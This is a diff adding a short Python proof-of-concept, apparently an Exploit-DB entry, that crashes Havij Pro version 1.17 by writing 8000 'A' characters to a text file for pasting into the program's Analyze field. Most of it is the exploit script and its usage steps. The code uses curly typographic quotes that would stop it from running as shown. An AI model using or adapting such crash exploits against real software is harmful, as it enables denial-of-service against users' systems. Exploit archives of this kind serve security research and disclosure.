@@ -1,0 +1,17 @@
+#!/usr/bin/env python
+#Exploit Title:Havij Pro Crash POC
+# Tested:windows7
+#Sofrware Link:http://www.itsecteam.com/
+#Version:1.17
+#Email:i_7e1@outlook.com
+#Author:M1x7e1@Safeye Team
+#run python poc.py
+#copy content to target
+#click Analyze
+
+## EDB-Note: tested and verified using version 1.6 Pro
+
+content = “\x41” * 8000
+file = open(“xx.txt”,”w”)
+file.write(content)
+file.close()
